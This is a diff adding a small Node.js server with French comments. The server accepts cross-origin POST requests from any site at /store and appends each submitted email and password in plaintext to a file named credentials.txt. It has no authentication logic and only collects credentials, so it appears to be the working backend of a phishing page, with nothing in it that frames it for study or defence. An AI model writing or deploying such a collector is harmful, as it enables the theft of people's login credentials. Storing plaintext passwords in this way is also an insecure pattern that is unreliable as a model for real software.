@@ -1,0 +1,78 @@
+const http = require('http');
+const fs = require('fs').promises; // Utilisation de fs.promises pour des écritures séquentielles
+
+const requestListener = async (req, res) => {
+    console.log(`Méthode : ${req.method}, URL : ${req.url}`);
+
+    // En-têtes CORS pour autoriser les requêtes inter-domaines
+    res.setHeader('Access-Control-Allow-Origin', '*');
+    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
+    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+    
+    // Gestion des requêtes OPTIONS (pré-requête CORS)
+    if (req.method === 'OPTIONS') {
+        res.writeHead(204); // Pas de contenu pour la pré-requête
+        res.end();
+        return;
+    }
+
+    // Gestion des requêtes GET (juste une vérification)
+    if (req.method === 'GET' && req.url === '/store') {
+        res.writeHead(200, { 'Content-Type': 'text/plain' });
+        res.end('Cette route accepte uniquement des requêtes POST.');
+        return;
+    }
+
+    // Gestion des requêtes POST
+    if (req.method === 'POST' && req.url === '/store') {
+        let body = '';
+
+        req.on('data', chunk => {
+            console.log('Chunk reçu :', chunk.toString()); // Log des données reçues
+            body += chunk.toString();
+        });
+
+        req.on('end', async () => {
+            try {
+                // Essayer de parser les données JSON
+                const data = JSON.parse(body);
+                const { email, password } = data;
+
+                if (email && password) {
+                    const entry = `Email: ${email}, Password: ${password}\n`;
+
+                    try {
+                        // Utilisation de fs.promises.appendFile pour garantir une écriture séquentielle
+                        await fs.appendFile('credentials.txt', entry);
+                        res.writeHead(200, { 'Content-Type': 'text/plain' });
+                        res.end('Informations enregistrées avec succès.');
+                    } catch (err) {
+                        console.error('Erreur lors de l\'écriture dans le fichier :', err);
+                        res.writeHead(500, { 'Content-Type': 'text/plain' });
+                        res.end('Erreur lors de l\'enregistrement.');
+                    }
+                } else {
+                    res.writeHead(400, { 'Content-Type': 'text/plain' });
+                    res.end('Données invalides. Email et mot de passe requis.');
+                }
+            } catch (err) {
+                console.error('Erreur JSON :', err);
+                res.writeHead(400, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ error: 'Données JSON invalides.' }));
+            }
+        });
+
+        return;
+    }
+
+    // Si aucune route ne correspond, on renvoie une erreur 404
+    res.writeHead(404, { 'Content-Type': 'text/plain' });
+    res.end('Route non trouvée.');
+};
+
+const server = http.createServer(requestListener);
+
+const PORT = 3000;
+server.listen(PORT, () => {
+    console.log(`Serveur démarré sur http://localhost:${PORT}`);
+});
